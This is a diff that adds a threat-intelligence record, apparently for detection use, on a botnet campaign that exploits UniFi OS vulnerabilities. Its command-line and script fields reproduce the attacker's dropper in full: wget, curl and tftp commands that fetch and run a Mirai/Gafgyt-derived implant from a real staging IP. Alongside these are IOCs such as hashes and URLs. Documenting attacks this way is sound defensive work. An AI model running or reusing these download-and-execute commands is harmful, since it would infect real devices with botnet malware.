@@ -1,0 +1,89 @@
+title: 'From One HTTP Request to a Botnet Implant: Anatomy of a UniFi OS Server Compromise
+  in the Wild'
+description: A threat actor is exploiting multiple critical vulnerabilities (CVE-2026-34908,
+  CVE-2026-34909, CVE-2026-34910) in Ubiquiti UniFi OS devices to achieve unauthenticated
+  remote code execution, then downloads and executes a Mirai/Gafgyt-derived IoT bot
+  (azsxd v2.0) across 14 CPU architectures. The implant is fetched via wget/curl/tftp
+  from a staging host and runs memory-resident after unlinking itself from disk.
+attribution: ''
+malware_families:
+- Mirai
+- Gafgyt
+- azsxd
+cves:
+- CVE-2026-34908
+- CVE-2026-34909
+- CVE-2026-34910
+- CVE-2026-33000
+ttps:
+  processes:
+  - wget
+  - curl
+  - tftp
+  - busybox
+  - zok
+  - sh
+  command_lines:
+  - cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; busybox wget http://185.228.26.16/zok
+    -O zok; curl -o zok http://185.228.26.16/zok; wget http://185.228.26.16/zok; chmod
+    777 zok; ./zok unifi.exploit
+  - wget http://$server_ip/$binname.$arch -O $output
+  - curl -o $output http://$server_ip/$binname.$arch
+  - tftp -g -l $output -r $binname.$arch $server_ip
+  - tftp $server_ip -c get $binname.$arch -l $output
+  - chmod 777 $output
+  - ./$output $1.$arch
+  - wget http://$server_ip/$binname.$arch -O $output || curl -o $output http://$server_ip/$binname.$arch
+    || tftp -g -l $output -r $binname.$arch $server_ip || tftp $server_ip -c get $binname.$arch
+    -l $output
+  powershell: []
+  scripts:
+  - "binarys=\"mips mpsl arm arm5 arm6 arm7 x86 arc sh4 ppc spc i5 i6 m68k\"\nserver_ip=\"\
+    185.228.26.16\"\nbinname=\"azsxd\"\noutput=\"cron.azsxd\"\nfor arch in $binarys;\
+    \ do\n  rm -rf $binname.$arch; rm -rf $output\n  wget http://$server_ip/$binname.$arch\
+    \ -O $output \\\n  || curl -o $output http://$server_ip/$binname.$arch \\\n  ||\
+    \ tftp -g -l $output -r $binname.$arch $server_ip \\\n  || tftp $server_ip -c\
+    \ get $binname.$arch -l $output\n  chmod 777 $output\n  ./$output $1.$arch\n \
+    \ rm -rf $binname.$arch; rm -rf $output\ndone"
+  - "s=\"mips mpsl arm arm5 arm6 arm7 x86 arc sh4 ppc spc i5 i6 m68k\"\nserver_ip=\"\
+    185.228.26.16\"\nbinname=\"azsxd\"\noutput=\"cron.azsxd\"\nfor arch in $binarys;\
+    \ do\n  rm -rf $binname.$arch; rm -rf $output\n  wget http://$server_ip/$binname.$arch\
+    \ -O $output \\\n    || curl -o $output http://$server_ip/$binname.$arch \\\n\
+    \    || tftp -g -l $output -r $binname.$arch $server_ip \\\n    || tftp $server_ip\
+    \ -c get $binname.$arch -l $output\n  chmod 777 $output\n  ./$output $1.$arch\n\
+    \  rm -rf $binname.$arch; rm -rf $output\ndone"
+  registry_keys: []
+  image_loads: []
+  network_connections:
+  - zok -> 185.228.26.16:80
+  - azsxd -> 185.228.26.16:80
+  - azsxd -> 185.228.26.16:69
+  - wget -> 185.228.26.16:80
+  - curl -> 185.228.26.16:80
+  - tftp -> 185.228.26.16:69
+  file_activity:
+  - /tmp/recovered.elf
+  persistence:
+  - Implant unlinks itself from disk after execution to run memory-resident (deleted
+    binary in /proc/*/exe)
+  process_relations:
+  - sh -> wget
+  - sh -> curl
+  - sh -> tftp
+  - sh -> busybox
+iocs:
+  hashes:
+  - 5833e2344434022e18e22c4b93dc4a7710908fd03312499014d5cabf06bfc459
+  - 01f64cac27788be2748a15ded358802c
+  ip_addresses:
+  - 176.65.148.183
+  - 185.228.26.16
+  domains: []
+  urls:
+  - hxxp://185.228.26[.]16/zok
+  - hxxp://185.228.26[.]16/azsxd.<arch>
+authors:
+- Xservus Limited
+reference: https://www.pwndefend.com/2026/06/09/cve-2026-34908-exploitation-itw-building-a-botnet-mirai/
+date_of_publication: June 09, 2026
+file_creation_date: June 11, 2026
